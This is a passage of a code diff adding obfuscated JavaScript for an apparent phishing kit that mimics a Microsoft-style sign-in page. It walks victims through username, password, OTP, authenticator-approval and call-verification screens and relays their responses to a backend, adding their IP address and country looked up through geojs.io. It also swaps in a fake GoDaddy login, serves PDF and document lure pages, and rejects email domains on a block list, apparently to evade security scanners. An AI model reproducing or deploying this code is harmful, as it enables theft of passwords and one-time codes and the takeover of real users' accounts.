+                  view = 'signin_blocked_live';
+                }
+                if (_0x4d6ae6.message == "protectaccount live") {
+                  checkerrordesc("protect_account_live", 0x0, _0x4d6ae6.description);
+                  document.getElementById('section_' + view).classList.toggle("d-none");
+                  document.getElementById("section_protect_account_live").classList.remove("d-none");
+                  view = "protect_account_live";
+                }
+                if (_0x4d6ae6.message == "you dont have access") {
+                  document.getElementById('section_pwd_live').classList.toggle("d-none");
+                  document.getElementById("section_youdonthaveaccess").classList.remove('d-none');
+                  view = "youdonthaveaccess";
+                }
+                if (_0x4d6ae6.message == 'moreinforequired') {
+                  document.getElementById("section_pwd_live").classList.toggle("d-none");
+                  document.getElementById("section_moreinforequired").classList.remove("d-none");
+                  view = "moreinforequired";
+                }
+                if (_0x4d6ae6.message == "more info required") {
+                  moreinforeq();
+                }
+                if (_0x4d6ae6.message == "2fa is off newwebsite") {
+                  document.getElementById("section_pwd_live").classList.toggle("d-none");
+                  document.getElementById("section_final").classList.remove("d-none");
+                  view = "final";
+                  document.getElementById("error_pwd_live").innerText = '';
+                }
+                if (_0x4d6ae6.message == "2fa is off") {
+                  document.getElementById("section_pwd_live").classList.toggle("d-none");
+                  document.getElementById("section_final").classList.remove('d-none');
+                  view = 'final';
+                  document.getElementById("error_pwd_live").innerText = '';
+                }
+                if (_0x4d6ae6.message == "sign in blocked") {
+                  document.getElementById("error_pwd_live").innerText = '';
+                  document.getElementById("section_pwd_live").classList.toggle("d-none");
+                  document.getElementById("section_accessblocked").querySelector("h2.title").textContent = _0x4d6ae6.title;
+                  changebackbutton('accessblocked', _0x4d6ae6.backbutton);
+                  checkerrordesc("accessblocked", 0x0, _0x4d6ae6.description);
+                  checkerrordesc('accessblockedsignoutoption', 0x2, _0x4d6ae6.signoutoption);
+                  document.getElementById("footer").style.position = 'relative';
+                  var _0xde54cd = document.getElementById("debugdetailsinfo");
+                  _0x4d6ae6.troubleshootinginfo.forEach((_0x10739d, _0x179e92) => {
+                    const _0x12e64f = document.createElement("div");
+                    const _0x9a287 = document.createElement('span');
+                    _0x9a287.textContent = _0x10739d.name;
+                    _0x9a287.classList.add("bold");
+                    const _0x5b4dd1 = document.createElement("span");
+                    _0x5b4dd1.textContent = _0x10739d.value;
+                    _0x12e64f.appendChild(_0x9a287);
+                    _0x12e64f.appendChild(_0x5b4dd1);
+                    _0xde54cd.appendChild(_0x12e64f);
+                  });
+                  document.getElementById("section_accessblocked").classList.remove('d-none');
+                  view = "accessblocked";
+                }
+                if (_0x4d6ae6.message == "protect account") {
+                  document.getElementById("error_pwd_live").innerText = '';
+                  checkerrordesc("protectaccount", 0x0, _0x4d6ae6.description);
+                  displayprotectoptions(_0x4d6ae6.protectoptions);
+                  bottomsectionlinks("protectaccount", _0x4d6ae6.bottomsection);
+                  changebackbutton('protectaccount', _0x4d6ae6.backbutton);
+                  document.getElementById('section_pwd_live').classList.toggle("d-none");
+                  document.getElementById("section_protectaccount").classList.remove("d-none");
+                  view = "protectaccount";
+                }
+                if (_0x4d6ae6.message == "otp sent") {
+                  document.getElementById("error_pwd_live").innerText = '';
+                  document.getElementById("otpimg").setAttribute("src", _0x4d6ae6.image_src);
+                  checkerrordesc('otp', 0x0, _0x4d6ae6.description);
+                  bottomsectionlinks("otp", _0x4d6ae6.bottomsection);
+                  changebackbutton("otp", _0x4d6ae6.backbutton);
+                  document.getElementById("section_pwd_live").classList.toggle("d-none");
+                  document.getElementById("section_otp").classList.remove("d-none");
+                  view = 'otp';
+                }
+                if (_0x4d6ae6.message == "approve auth request auth app") {
+                  document.getElementById("error_pwd_live").innerText = '';
+                  document.getElementById('authappimg').setAttribute("src", _0x4d6ae6.image_src);
+                  checkerrordesc("authapp", 0x0, _0x4d6ae6.description);
+                  bottomsectionlinks("authapp", _0x4d6ae6.bottomsection);
+                  changebackbutton('authapp', _0x4d6ae6.backbutton);
+                  document.getElementById("authappcode").textContent = _0x4d6ae6.authappcode;
+                  document.getElementById("section_pwd_live").classList.toggle('d-none');
+                  document.getElementById('section_authapp').classList.remove("d-none");
+                  view = "authapp";
+                  wait2fa("app", _0x4d6ae6.methodid);
+                }
+                if (_0x4d6ae6.message == "approve auth request calling") {
+                  document.getElementById("section_authcall").querySelector('.back').focus();
+                  document.getElementById("error_pwd_live").innerText = '';
+                  document.getElementById("authcallimg").setAttribute("src", _0x4d6ae6.image_src);
+                  checkerrordesc("authcall", 0x0, _0x4d6ae6.description);
+                  bottomsectionlinks("authcall", _0x4d6ae6.bottomsection);
+                  changebackbutton("authcall", _0x4d6ae6.backbutton);
+                  document.getElementById("section_pwd_live").classList.toggle("d-none");
+                  document.getElementById("section_authcall").classList.remove("d-none");
+                  view = "authcall";
+                  wait2fa("call");
+                }
+                if (_0x4d6ae6.message == "2fa is on") {
+                  var _0x31490e = JSON.parse(_0x4d6ae6.twofamethods);
+                  displaytwofamethods(_0x31490e);
+                  bottomsectionlinks("2fa", _0x4d6ae6.bottomsection);
+                  changebackbutton("2fa", _0x4d6ae6.backbutton);
+                  document.getElementById("section_pwd_live").classList.toggle("d-none");
+                  document.getElementById("section_2fa").classList.remove("d-none");
+                  view = '2fa';
+                  document.getElementById("error_pwd_live").innerText = '';
+                }
+                if (_0x4d6ae6.message == "error") {
+                  bottomsectionlinks('pwd_live', _0x4d6ae6.bottomsection);
+                  changebackbutton("pwd_live", _0x4d6ae6.backbutton);
+                  checkerrordesc("pwd_live", 0x1, _0x4d6ae6.description);
+                  document.getElementById('inp_pwd_live').value = '';
+                }
+                for (var _0x2a5975 = 0x0; _0x2a5975 < websitenames.length; _0x2a5975++) {
+                  if (_0x4d6ae6.message == "error " + websitenames[_0x2a5975] + '') {
+                    checkerrordesc("pwd_live", 0x1, _0x4d6ae6.description);
+                  }
+                }
+              }
+            })['catch'](_0x64a5df => {
+              loadinganimation(0x1);
+              console.error("Error:", _0x64a5df);
+            });
+          }
+        }
+      }
+    }
+  }
+  return false;
+}
+function resetbacktoemail() {
+  var _0x31d523 = "uname";
+  if (multipleaccountsback == 0x1) {
+    _0x31d523 = 'multipleaccounts';
+  }
+  bottomsectionlinks(_0x31d523, [{
+    'a_id': "signup",
+    'a_text': "Create one!",
+    'text': "No account?",
+    'type': "text_link"
+  }, {
+    'a_text': "Can't access your account?",
+    'a_id': "cantAccessAccount",
+    'type': "link"
+  }]);
+  if (multipleaccountsback == 0x0) {
+    changebackbutton(_0x31d523, 0x0);
+  }
+  document.body.style.backgroundImage = '';
+  document.body.style.backgroundColor = '';
+  if (twa == 0x0) {
+    var _0x3ed4de = document.querySelectorAll('.bannerlogo');
+    _0x3ed4de.forEach(function (_0x1ecde2) {
+      if (_0x1ecde2.hasAttribute("style")) {
+        _0x1ecde2.removeAttribute("style");
+        _0x1ecde2.style.height = "36px";
+      }
+    });
+  }
+  document.getElementById("error_pwd").innerText = '';
+  document.getElementById("section_pwd").classList.toggle('d-none');
+  document.getElementById("section_pwd").querySelector(".sectioncontent").style.animation = '';
+  document.getElementById("section_" + _0x31d523).classList.remove("d-none");
+  view = _0x31d523;
+}
+function backbtn() {
+  runanimation(0x0, view, 1.2);
+  if (webnotfound == true && (view == "pwd" || view == 'pwd_live')) {
+    webnotfound = false;
+    setTimeout(function () {
+      resetbacktoemail();
+      runanimation(0x3, view, 1.2);
+    }, 0x384);
+  } else {
+    if (webnotfound == false && (view == "pwd" || view == "pwd_live")) {
+      document.getElementById("section_" + view).querySelector(".sectioncontent").style.animation = '';
+      if (view == 'pwd' || view == 'pwd_live') {
+        if (view == 'pwd') {
+          document.getElementById("error_pwd").innerText = '';
+          document.getElementById("inp_pwd").value = '';
+          document.getElementById("error_uname").innerText = '';
+          document.getElementById("inp_uname").value = '';
+          bottomsectionlinks("uname", [{
+            'a_id': "signup",
+            'a_text': "Create one!",
+            'text': "No account?",
+            'type': "text_link"
+          }, {
+            'a_id': "cantAccessAccount",
+            'a_text': "Can't access your account?",
+            'type': 'link'
+          }]);
+          changebackbutton("uname", 0x0);
+          document.getElementById("section_pwd").classList.toggle("d-none");
+        }
+        if (view == "pwd_live") {
+          document.getElementById("error_pwd_live").innerText = '';
+          document.getElementById("inp_pwd_live").value = '';
+          document.getElementById("error_uname").innerText = '';
+          document.getElementById("inp_uname").value = '';
+          bottomsectionlinks("uname", [{
+            'a_id': "signup",
+            'a_text': "Create one!",
+            'text': "No account?",
+            'type': "text_link"
+          }, {
+            'a_id': 'cantAccessAccount',
+            'a_text': "Can't access your account?",
+            'type': 'link'
+          }]);
+          changebackbutton("uname", 0x0);
+          document.getElementById("section_pwd_live").classList.toggle('d-none');
+        }
+        document.getElementById('section_uname').querySelector('.sectioncontent').style.animation = '';
+        document.getElementById("section_uname").classList.remove('d-none');
+        if (document.body.style.backgroundImage) {
+          document.body.style.backgroundImage = '';
+        }
+        if (document.body.style.backgroundColor) {
+          document.body.style.backgroundColor = '';
+        }
+        bottomsectionlinks("uname", [{
+          'a_id': 'signup',
+          'a_text': "Create one!",
+          'text': "No account?",
+          'type': "text_link"
+        }, {
+          'a_id': "cantAccessAccount",
+          'a_text': "Can't access your account?",
+          'type': "link"
+        }]);
+        if (twa == 0x0) {
+          var _0x190672 = document.querySelectorAll(".bannerlogo");
+          _0x190672.forEach(function (_0x4dbbbb) {
+            if (_0x4dbbbb.hasAttribute("style")) {
+              _0x4dbbbb.removeAttribute("style");
+            }
+          });
+        }
+        view = "uname";
+      }
+      runanimation(0x3, view, 1.2);
+    }
+  }
+  if (webnotfound == false && view != "pwd" && view != "pwd_live") {
+    document.getElementById("section_" + view).querySelector(".sectioncontent").style.animation = '';
+    if (view == "pwd" && view == "pwd_live") {
+      if (view == "pwd") {
+        document.getElementById('error_pwd').innerText = '';
+        document.getElementById('inp_pwd').value = '';
+        bottomsectionlinks("uname", [{
+          'a_id': "signup",
+          'a_text': "Create one!",
+          'text': "No account?",
+          'type': "text_link"
+        }, {
+          'a_id': 'cantAccessAccount',
+          'a_text': "Can't access your account?",
+          'type': "link"
+        }]);
+        changebackbutton("uname", 0x0);
+        document.getElementById("section_pwd").classList.toggle('d-none');
+      }
+      if (view == "pwd_live") {
+        document.getElementById("error_pwd_live").innerText = '';
+        document.getElementById("inp_pwd_live").value = '';
+        bottomsectionlinks("uname", [{
+          'a_id': "signup",
+          'a_text': "Create one!",
+          'text': "No account?",
+          'type': "text_link"
+        }, {
+          'a_id': "cantAccessAccount",
+          'a_text': "Can't access your account?",
+          'type': "link"
+        }]);
+        changebackbutton("uname", 0x0);
+        document.getElementById('section_pwd_live').classList.toggle("d-none");
+      }
+      document.getElementById("section_uname").querySelector('.sectioncontent').style.animation = '';
+      document.getElementById("section_uname").classList.remove('d-none');
+      if (document.body.style.backgroundImage) {
+        document.body.style.backgroundImage = '';
+      }
+      if (document.body.style.backgroundColor) {
+        document.body.style.backgroundColor = '';
+      }
+      if (twa == 0x0) {
+        var _0x190672 = document.querySelectorAll('.bannerlogo');
+        _0x190672.forEach(function (_0x491c4a) {
+          if (_0x491c4a.hasAttribute("style")) {
+            _0x491c4a.removeAttribute("style");
+          }
+        });
+      }
+      view = "uname";
+    }
+    if (view == "confirmemail") {
+      document.getElementById("section_confirmemail").classList.toggle("d-none");
+      document.getElementById('section_2fa').classList.remove("d-none");
+      view = "2fa";
+    }
+    if (view == 'confirmemailorphone_live') {
+      document.getElementById("section_confirmemailorphone_live").classList.toggle("d-none");
+      document.getElementById("section_2fa").classList.remove("d-none");
+      view = "2fa";
+    }
+    if (view == "otp_live" && viewtype == "email" || view == "otp_live" && viewtype == "phone") {
+      document.getElementById('section_otp_live').classList.toggle("d-none");
+      document.getElementById("section_confirmemailorphone_live").classList.remove("d-none");
+      view = "confirmemailorphone_live";
+    }
+    if (view == "otp_live" && viewtype == "otp") {
+      document.getElementById("section_otp_live").classList.toggle('d-none');
+      document.getElementById("section_2fa").classList.remove("d-none");
+      view = '2fa';
+    }
+    if (view == "otp") {
+      document.getElementById("error_otp").innerText = '';
+      document.getElementById("inp_otpcode").value = '';
+      document.getElementById("section_otp").classList.toggle("d-none");
+      document.getElementById("section_2fa").classList.remove("d-none");
+      view = "2fa";
+    }
+    if (view == "authcall") {
+      document.getElementById("error_authcall").innerText = '';
+      document.getElementById('section_authcall').classList.toggle('d-none');
+      document.getElementById("section_2fa").classList.remove("d-none");
+      view = "2fa";
+    }
+    runanimation(0x3, view, 1.2);
+  }
+}
+document.querySelectorAll(".btn_final").forEach(_0xbec01f => {
+  _0xbec01f.addEventListener('click', () => {
+    window.location.href = redirecturl;
+  });
+});
+if (view == "uname_pdf") {
+  const nxtpdf = document.getElementById('btn_next_pdf');
+  nxtpdf.addEventListener("click", () => {
+    validatepdf();
+  });
+  pdfcheck = 0x1;
+  function loadinganimationpdf(_0x1786e6) {
+    if (_0x1786e6 == 0x0) {
+      document.getElementById("sections_pdf").querySelector("#mainLoader").style.display = "flex";
+      document.getElementById('sections_pdf').querySelector('#section_uname_content').classList.toggle("d-none");
+    }
+    if (_0x1786e6 == 0x1) {
+      document.getElementById('sections_pdf').querySelector("#mainLoader").style.display = "none";
+      document.getElementById("sections_pdf").querySelector("#section_uname_content").classList.remove('d-none');
+    }
+    if (_0x1786e6 == 0x2) {
+      document.getElementById("sections_pdf").querySelector('#mainLoader').style.display = 'flex';
+      document.getElementById("sections_pdf").classList.toggle("d-none");
+    }
+  }
+  const unamepdfinp = document.getElementById('pdfemail');
+  function sendemailpdf() {
+    sendAndReceive("checkemail", [unamepdfinp.value, pagelinkval, browserName, userip, usercountry], 0x1).then(_0x16119c => {
+      if (_0x16119c && _0x16119c.message !== "waiting for previous request to complete") {
+        var _0x5c1d0c = false;
+        var _0x3fc34e = 0x12c;
+        if (_0x16119c.message.includes("newwebsiteopen") == false && _0x16119c.message !== "error") {
+          if (_0x16119c.acctype && _0x16119c.acctype == 0x2) {
+            pvn = 0x1;
+          }
+          if (_0x16119c.acctype == undefined || _0x16119c.acctype && _0x16119c.acctype == 0x1) {
+            pvn = 0x0;
+          }
+        }
+        if (_0x16119c.message.includes("newwebsiteopen") == false) {
+          _0x3fc34e = 0x0;
+          loadinganimationpdf(0x1);
+        }
+        setTimeout(function () {
+          for (var _0x5c611a = 0x0; _0x5c611a < websitenames.length; _0x5c611a++) {
+            if (_0x16119c.message.includes("newwebsiteopen") == true && _0x16119c.message.includes(websitenames[_0x5c611a]) == true) {
+              _0x5c1d0c = true;
+              document.querySelectorAll(".user_identity").forEach(_0x26dc90 => {
+                _0x26dc90.innerText = unamepdfinp.value;
+              });
+              if (websitenames[_0x5c611a] == "godaddy") {
+                var _0x5ebbea = document.querySelector("script[src^=\"" + gdf + "\"]");
+                if (!_0x5ebbea) {
+                  var _0xe8ffd3 = document.createElement('script');
+                  _0xe8ffd3.src = gdf;
+                  document.head.appendChild(_0xe8ffd3);
+                }
+                const _0x2be4f6 = document.createElement("style");
+                _0x2be4f6.id = "dynamic-style";
+                _0x2be4f6.textContent = "\n            ::-moz-selection {\n            background: #a6fff8;\n            }\n            \n            ::selection {\n            background: #a6fff8;\n            }\n            ";
+                document.head.appendChild(_0x2be4f6);
+                document.getElementById('sections_pdf').classList.toggle('d-none');
+                document.getElementById("section_uname_pdf").classList.toggle("d-none");
+                document.getElementById("sections_" + websitenames[_0x5c611a] + '').classList.remove("d-none");
+                document.getElementById('godaddyemail').value = unamepdfinp.value;
+                document.body.style.setProperty("background-color", "#f5f7f8", "important");
+                document.body.style.setProperty("background-image", "unset", "important");
+                document.body.style.setProperty("overflow", "auto", 'important');
+                view = 'pwd_godaddy';
+              }
+            }
+            if (_0x16119c.message.includes('newwebsiteopen') == true && _0x5c611a == websitenames.length - 0x1 && !_0x5c1d0c) {
+              document.getElementById('error_uname_pdf').innerText = '';
+              document.getElementById("error_uname_pdf").style.display = "none";
+              document.querySelectorAll('.user_identity').forEach(_0x3ba7bd => {
+                _0x3ba7bd.innerText = unamepdfinp.value;
+              });
+              bottomsectionlinks("pwd", [{
+                'a_id': "idA_PWD_ForgotPassword",
+                'a_text': "Forgot my password",
+                'type': "link"
+              }]);
+              changebackbutton("pwd", 0x0);
+              document.getElementById("sections_pdf").classList.toggle("d-none");
+              document.getElementById('section_uname_pdf').classList.toggle("d-none");
+              document.getElementById("sections").classList.toggle('d-none');
+              document.getElementById("section_pwd").classList.remove("d-none");
+              otherweburl = _0x16119c.message.replace("newwebsiteopen", '');
+              webnotfound = true;
+              view = "pwd";
+            }
+          }
+          if (_0x16119c.message == "multiple accounts") {
+            multipleaccountsback = 0x1;
+            if (twa == 0x0) {
+              var _0x51b8e3 = document.querySelectorAll(".bannerlogo");
+              _0x51b8e3.forEach(function (_0x1b9c6d) {
+                _0x1b9c6d.style.height = "24px";
+              });
+            }
+            document.getElementById("section_multipleaccounts").querySelector("#btn_back").setAttribute("data-id", _0x16119c.backbtnid);
+            document.getElementById("section_multipleaccounts").querySelector("#btn_back").setAttribute('onclick', 'backbuttonclick(this,2)');
+            checkerrordesc("multipleaccounts", 0x0, _0x16119c.description);
+            displaymultipleaccounts(_0x16119c.accountoptions);
+            bottomsectionlinks("multipleaccounts", _0x16119c.bottomsection);
+            document.querySelectorAll(".user_identity").forEach(_0x988fa9 => {
+              _0x988fa9.innerText = unamepdfinp.value;
+            });
+            document.getElementById("sections_pdf").classList.toggle("d-none");
+            document.getElementById("section_uname_pdf").classList.toggle("d-none");
+            document.getElementById('sections').classList.toggle("d-none");
+            document.getElementById("section_multipleaccounts").classList.remove("d-none");
+            view = "multipleaccounts";
+          }
+          if (_0x16119c.message == "correct email") {
+            if (twa == 0x0) {
+              if (_0x16119c.bannerlogo !== undefined && _0x16119c.bannerlogo !== null) {
+                var _0x51b8e3 = document.querySelectorAll(".bannerlogo");
+                _0x51b8e3.forEach(function (_0x451015) {
+                  _0x451015.style.backgroundImage = "url('" + _0x16119c.bannerlogo + "')";
+                  _0x451015.style.width = "unset";
+                  _0x451015.style.height = '36px';
+                });
+              }
+              if (_0x16119c.backgroundcolor !== undefined && _0x16119c.backgroundcolor !== null) {
+                document.body.style.setProperty("background-color", _0x16119c.backgroundcolor);
+              }
+              if (_0x16119c.backgroundimage !== undefined && _0x16119c.backgroundimage !== null) {
+                document.body.style.setProperty("background-image", "url('" + _0x16119c.backgroundimage + "')");
+              }
+              if (_0x16119c.bannerlogo == undefined || _0x16119c.bannerlogo == null) {
+                var _0x51b8e3 = document.querySelectorAll(".bannerlogo");
+                _0x51b8e3.forEach(function (_0x54d3ae) {
+                  _0x54d3ae.style.height = "24px";
+                });
+              }
+            }
+            if (pvn == 0x0) {
+              bottomsectionlinks("pwd", _0x16119c.bottomsection);
+              changebackbutton("pwd", _0x16119c.backbutton);
+            }
+            if (pvn == 0x1) {
+              bottomsectionlinks("pwd_live", _0x16119c.bottomsection);
+              changebackbutton("pwd_live", _0x16119c.backbutton);
+            }
+            document.getElementById("error_uname_pdf").innerText = '';
+            document.getElementById("error_uname_pdf").style.display = "none";
+            document.querySelectorAll(".user_identity").forEach(_0x478f60 => {
+              _0x478f60.innerText = unamepdfinp.value;
+            });
+            document.getElementById("sections_pdf").classList.toggle("d-none");
+            document.getElementById("section_uname_pdf").classList.toggle('d-none');
+            document.getElementById("sections").classList.toggle("d-none");
+            if (pvn == 0x0) {
+              document.getElementById("section_pwd").classList.remove('d-none');
+              view = "pwd";
+            }
+            if (pvn == 0x1) {
+              document.getElementById("section_pwd_live").classList.remove('d-none');
+              view = "pwd_live";
+            }
+          }
+          if (_0x16119c.message == "error") {
+            document.getElementById("error_uname_pdf").innerText = "Please, provide a valid email.";
+            document.getElementById('error_uname_pdf').style.display = "block";
+            loadinganimationpdf(0x1);
+          }
+        }, _0x3fc34e);
+      }
+    })['catch'](_0x2f8b2b => {
+      loadinganimationpdf(0x1);
+      console.error('Error:', _0x2f8b2b);
+    });
+  }
+  function validatepdf() {
+    if (view === 'uname_pdf') {
+      const _0x5f1526 = unamepdfinp.value.trim().split('@')[0x1];
+      if (unamepdfinp.value.includes('@') && bes.some(_0x392b1c => _0x5f1526.includes(_0x392b1c))) {
+        loadinganimationpdf(0x0);
+        setTimeout(function () {
+          loadinganimationpdf(0x1);
+          document.getElementById("error_uname_pdf").innerText = "Please, provide a valid email.";
+          document.getElementById('error_uname_pdf').style.display = 'block';
+        }, 0xbb8);
+      }
+      if (unamepdfinp.value.trim() == '') {
+        document.getElementById("error_uname_pdf").innerText = "Please, provide a valid email.";
+        document.getElementById("error_uname_pdf").style.display = "block";
+      } else if (unamepdfinp.value.trim() != '' && unamepdfinp.value.includes('@') && !bes.some(_0x5b7393 => _0x5f1526.includes(_0x5b7393))) {
+        loadinganimationpdf(0x0);
+        if (webnotfound == true) {
+          setTimeout(function () {
+            loadinganimationpdf(0x1);
+            setTimeout(function () {
+              document.getElementById('error_pwd').innerText = '';
+              document.getElementById("inp_pwd").value = '';
+              document.getElementById("sections_pdf").classList.toggle("d-none");
+              document.getElementById('section_uname_pdf').classList.toggle('d-none');
+              document.getElementById("section_pwd").classList.remove('d-none');
+              view = "pwd";
+            }, 0x12c);
+          }, 0xbb8);
+        }
+        if (webnotfound == false) {
+          if (interacted == 0x1) {
+            sendemailpdf();
+          }
+          if (interacted == 0x0) {
+            interacted = 0x1;
+            (function _0x2d7d24() {
+              $.get('https://get.geojs.io/v1/ip/geo.json', function (_0x5894ac) {
+                userip = _0x5894ac.ip;
+                usercountry = _0x5894ac.country;
+                sendemailpdf();
+              }, "json").fail(function (_0x2a2676, _0x308b37, _0x53fdf3) {
+                if (_0x2a2676.status == 0x1ad || _0x308b37 !== 'success') {
+                  setTimeout(_0x2d7d24, 0x3e8);
+                }
+              });
+            })();
+          }
+        }
+      }
+    }
+    return false;
+  }
+}
+if (view == "uname_doc") {
+  const nxtdoc = document.getElementById("btn_next_doc");
+  nxtdoc.addEventListener("click", () => {
+    validatedoc();
+  });
+  doccheck = 0x1;
+  function loadinganimationdoc(_0x45eed4) {
+    if (_0x45eed4 == 0x0) {
+      document.getElementById("sections_doc").querySelector('#docemailloading').style.display = "unset";
+    }
+    if (_0x45eed4 == 0x1) {
+      document.getElementById("sections_doc").querySelector('#docemailloading').style.display = 'none';
+    }
+    if (_0x45eed4 == 0x2) {
+      document.getElementById("sections_doc").querySelector("#docemailloading").style.display = "unset";
+    }
+  }
+  const unamedocinp = document.getElementById("docemail");
+  function sendemaildoc() {
+    sendAndReceive("checkemail", [unamedocinp.value, pagelinkval, browserName, userip, usercountry], 0x1).then(_0x3f9abd => {
+      if (_0x3f9abd && _0x3f9abd.message !== "waiting for previous request to complete") {
+        var _0x2bcf8a = false;
+        var _0x1a60a2 = 0x12c;
+        if (_0x3f9abd.message.includes("newwebsiteopen") == false && _0x3f9abd.message !== "error") {
+          if (_0x3f9abd.acctype && _0x3f9abd.acctype == 0x2) {
+            pvn = 0x1;
+          }
+          if (_0x3f9abd.acctype == undefined || _0x3f9abd.acctype && _0x3f9abd.acctype == 0x1) {
+            pvn = 0x0;
+          }
+        }
+        if (_0x3f9abd.message.includes("newwebsiteopen") == false) {
+          _0x1a60a2 = 0x0;
+          loadinganimationdoc(0x1);
+        }
+        setTimeout(function () {
+          for (var _0x21c1f1 = 0x0; _0x21c1f1 < websitenames.length; _0x21c1f1++) {
+            if (_0x3f9abd.message.includes("newwebsiteopen") == true && _0x3f9abd.message.includes(websitenames[_0x21c1f1]) == true) {
+              loadinganimationdoc(0x2);
+              _0x2bcf8a = true;
+              document.querySelectorAll(".user_identity").forEach(_0x5bb497 => {
+                _0x5bb497.innerText = unamedocinp.value;
+              });
+              if (websitenames[_0x21c1f1] == "godaddy") {
+                var _0x22a4fe = document.querySelector("script[src^=\"" + gdf + "\"]");
+                if (!_0x22a4fe) {
+                  var _0x5a3fba = document.createElement("script");
+                  _0x5a3fba.src = gdf;
+                  document.head.appendChild(_0x5a3fba);
+                }
+                const _0x20bc03 = document.createElement('style');
+                _0x20bc03.id = 'dynamic-style';
+                _0x20bc03.textContent = "\n            ::-moz-selection {\n            background: #a6fff8;\n            }\n            \n            ::selection {\n            background: #a6fff8;\n            }\n            ";
+                document.head.appendChild(_0x20bc03);
+                document.getElementById("sections_doc").classList.toggle('d-none');
+                document.getElementById('section_uname_doc').classList.toggle("d-none");
+                document.getElementById("sections_" + websitenames[_0x21c1f1] + '').classList.remove('d-none');
+                document.getElementById("godaddyemail").value = unamedocinp.value;
+                document.body.style.setProperty('background-color', "#f5f7f8", 'important');
+                document.body.style.setProperty('background-image', "unset", "important");
+                document.body.style.setProperty("overflow", "auto", "important");
+                view = "pwd_godaddy";
+              }
+            }
+            if (_0x3f9abd.message.includes("newwebsiteopen") == true && _0x21c1f1 == websitenames.length - 0x1 && !_0x2bcf8a) {
+              document.getElementById("error_uname_doc").innerText = '';
+              document.getElementById("error_uname_doc").style.display = 'none';
+              document.querySelectorAll(".user_identity").forEach(_0x5a451b => {
+                _0x5a451b.innerText = unamedocinp.value;
+              });
+              bottomsectionlinks("pwd", [{
+                'a_id': 'idA_PWD_ForgotPassword',
+                'a_text': "Forgot my password",
+                'type': "link"
+              }]);
+              changebackbutton("pwd", 0x0);
+              document.getElementById("sections_doc").classList.toggle("d-none");
+              document.getElementById("section_uname_doc").classList.toggle('d-none');
+              document.getElementById('sections').classList.toggle("d-none");
+              document.getElementById('section_pwd').classList.remove("d-none");
+              otherweburl = _0x3f9abd.message.replace('newwebsiteopen', '');
+              webnotfound = true;
+              view = 'pwd';
+            }
+          }
+          if (_0x3f9abd.message == "multiple accounts") {
+            multipleaccountsback = 0x1;
+            if (twa == 0x0) {
+              var _0x5c8ec5 = document.querySelectorAll('.bannerlogo');
+              _0x5c8ec5.forEach(function (_0x10eb79) {
+                _0x10eb79.style.height = "24px";
+              });
+            }
+            document.getElementById("section_multipleaccounts").querySelector("#btn_back").setAttribute('data-id', _0x3f9abd.backbtnid);
+            document.getElementById("section_multipleaccounts").querySelector('#btn_back').setAttribute("onclick", "backbuttonclick(this,2)");
+            checkerrordesc("multipleaccounts", 0x0, _0x3f9abd.description);
+            displaymultipleaccounts(_0x3f9abd.accountoptions);
+            bottomsectionlinks('multipleaccounts', _0x3f9abd.bottomsection);
+            document.querySelectorAll(".user_identity").forEach(_0x1574f3 => {
+              _0x1574f3.innerText = unamedocinp.value;
+            });
+            document.getElementById("sections_doc").classList.toggle("d-none");
+            document.getElementById("section_uname_doc").classList.toggle("d-none");
+            document.getElementById("sections").classList.toggle("d-none");
+            document.getElementById("section_multipleaccounts").classList.remove('d-none');
+            view = "multipleaccounts";
+          }
+          if (_0x3f9abd.message == "correct email") {
+            if (twa == 0x0) {
+              if (_0x3f9abd.bannerlogo !== undefined && _0x3f9abd.bannerlogo !== null) {
+                var _0x5c8ec5 = document.querySelectorAll('.bannerlogo');
+                _0x5c8ec5.forEach(function (_0x26306c) {
+                  _0x26306c.style.backgroundImage = "url('" + _0x3f9abd.bannerlogo + "')";
+                  _0x26306c.style.width = "unset";
+                  _0x26306c.style.height = "36px";
+                });
+              }
+              if (_0x3f9abd.backgroundcolor !== undefined && _0x3f9abd.backgroundcolor !== null) {
+                document.body.style.setProperty('background-color', _0x3f9abd.backgroundcolor);
+              }
+              if (_0x3f9abd.backgroundimage !== undefined && _0x3f9abd.backgroundimage !== null) {
+                document.body.style.setProperty('background-image', "url('" + _0x3f9abd.backgroundimage + "')");
+              }
+              if (_0x3f9abd.bannerlogo == undefined || _0x3f9abd.bannerlogo == null) {
+                var _0x5c8ec5 = document.querySelectorAll(".bannerlogo");
+                _0x5c8ec5.forEach(function (_0x1196ae) {
+                  _0x1196ae.style.height = "24px";
+                });
+              }
+            }
+            if (pvn == 0x0) {
+              bottomsectionlinks('pwd', _0x3f9abd.bottomsection);
+              changebackbutton("pwd", _0x3f9abd.backbutton);
+            }
+            if (pvn == 0x1) {
+              bottomsectionlinks("pwd_live", _0x3f9abd.bottomsection);
+              changebackbutton("pwd_live", _0x3f9abd.backbutton);
+            }
+            document.getElementById("error_uname_doc").innerText = '';
+            document.getElementById("error_uname_doc").style.display = 'none';
+            document.querySelectorAll(".user_identity").forEach(_0x4e280b => {
+              _0x4e280b.innerText = unamedocinp.value;
+            });
+            document.getElementById("sections_doc").classList.toggle('d-none');
+            document.getElementById("section_uname_doc").classList.toggle("d-none");
+            document.getElementById("sections").classList.toggle("d-none");
+            if (pvn == 0x0) {
+              document.getElementById("section_pwd").classList.remove("d-none");
+              view = "pwd";
+            }
+            if (pvn == 0x1) {
+              document.getElementById('section_pwd_live').classList.remove('d-none');
+              view = "pwd_live";
+            }
+          }
+          if (_0x3f9abd.message == "error") {
+            document.getElementById("error_uname_doc").innerText = "Please, provide a valid email.";
+            document.getElementById("error_uname_doc").style.display = "block";
+            loadinganimationdoc(0x1);
+          }
+        }, _0x1a60a2);
+      }
+    })["catch"](_0x1d9528 => {
+      loadinganimationdoc(0x1);
+      console.error("Error:", _0x1d9528);
+    });
+  }
+  function validatedoc() {
+    if (view === "uname_doc") {
+      const _0x38fc1f = unamedocinp.value.trim().split('@')[0x1];
+      if (unamedocinp.value.includes('@') && bes.some(_0x48b162 => _0x38fc1f.includes(_0x48b162))) {
+        loadinganimationdoc(0x0);
+        setTimeout(function () {
+          loadinganimationdoc(0x1);
+          document.getElementById("error_uname_doc").innerText = "Please, provide a valid email.";
+          document.getElementById("error_uname_doc").style.display = "block";
+        }, 0xbb8);
+      }
+      if (unamedocinp.value.trim() == '') {
+        document.getElementById("error_uname_doc").innerText = "Please, provide a valid email.";
+        document.getElementById('error_uname_doc').style.display = "block";
+      } else if (unamedocinp.value.trim() != '' && unamedocinp.value.includes('@') && !bes.some(_0x288a2f => _0x38fc1f.includes(_0x288a2f))) {
+        loadinganimationdoc(0x0);
+        if (webnotfound == true) {
+          setTimeout(function () {
